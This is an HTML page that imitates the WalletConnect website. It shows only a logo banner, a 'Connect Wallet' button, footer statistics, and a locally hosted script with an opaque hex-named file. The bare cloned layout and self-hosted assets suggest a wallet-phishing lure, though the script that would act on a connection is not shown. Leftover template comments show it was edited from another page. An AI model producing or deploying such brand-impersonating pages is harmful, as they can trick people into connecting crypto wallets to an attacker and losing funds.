<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WalletConnect: The onchain UX ecosystem</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
    
    <!-- Favicon -->
    <link rel="icon" type="image/avif" href="./icon_1.avif">
    <link rel="icon" type="image/webp" href="./icon_1.webp">
    <link rel="icon" type="image/png" href="./icon_1.png">
    
    <style>
        :root {
            --header-height: 70px;
            --mobile-header-height: 60px;
            --footer-height: 126px;
            --mobile-footer-height: 150px;
            --modern-font: 'Inter', sans-serif;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
            overflow: hidden;
            background: #000;
            font-family: var(--modern-font);
        }

        header, footer {
            position: fixed;
            width: 100%;
            background: rgba(0, 0, 0, 0.95);
            padding: 15px 20px;
            display: flex;
            align-items: center;
            z-index: 997; /* Updated z-index */
            backdrop-filter: blur(5px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        header {
            top: 0;
            height: var(--header-height);
            justify-content: space-between;
        }

        footer {
            bottom: 0;
            height: var(--footer-height);
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            border-bottom: none;
            justify-content: flex-start;
            padding: 15px 20px;
        }

        .content-wrapper {
            position: fixed;
            top: var(--header-height);
            left: 0;
            width: 100%;
            height: calc(100% - var(--header-height) - var(--footer-height));
            background: black;
            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            z-index: 1;
            animation: subtleZoom 10s infinite alternate;
        }

        /* Connect Wallet Button */
        .open {
            background: transparent;
            color: #fff;
            padding: 10px 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.3s ease;
            position: relative;
            z-index: 999; /* Higher than header/footer */
            margin-left: auto; /* Pushes to right in header */
        }

        .open:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: scale(1.05);
        }

        .open:focus-visible {
            outline: 2px solid #4285f4;
            outline-offset: 2px;
        }

        /* Full-screen overlay */
        .open:active ~ .content-wrapper::after {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.9);
            z-index: 998; /* Between header and button */
        }

        @media (max-width: 768px) {
            .open {
                padding: 8px 16px;
                font-size: 14px;
            }
        }

        /* Rest of your existing styles... */
        /* [Keep all other existing styles the same] */
    </style>
</head>
<body>
    <header>
        <picture>
            <source srcset="./banner.avif" type="image/avif">
            <source srcset="./banner.webp" type="image/webp">
            <img src="./banner.png" 
                 alt="Platform Logo"
                 class="logo-banner"
                 loading="eager"
                 width="240"
                 height="40">
        </picture>
        <button class="open">Connect Wallet</button>
    </header>

    <div class="content-wrapper" role="presentation"></div>

    <footer>
        <div class="footer-stats">
            <div>
                <span>38000000+</span>
                Unique active wallets
            </div>
            <div>
                <span>240000000+</span>
                Connections
            </div>
            <div>
                <span>57000+</span>
                Apps
            </div>
        </div>
    </footer>

    <script src="./67df00867259dcef4dfd676b.js"></script>
</body>
</html>
